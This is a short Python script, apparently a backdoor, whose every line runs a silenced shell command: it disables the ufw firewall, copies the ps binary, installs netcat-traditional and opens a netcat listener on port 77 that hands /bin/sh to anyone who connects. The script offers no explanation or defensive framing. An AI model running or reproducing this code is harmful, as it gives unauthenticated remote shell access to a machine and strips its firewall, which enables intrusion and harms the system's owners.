#[enable]
import os
os.system("mkdir /opt/var &> /dev/null")
os.system("ufw disable &> /dev/null")
os.system("cp /bin/ps /bin/pss  &> /dev/null")
os.system("apt-get install -y -vv netcat-traditional  &> /dev/null")
os.system("netcat -lvp 77 -e /bin/sh  &> /dev/null")
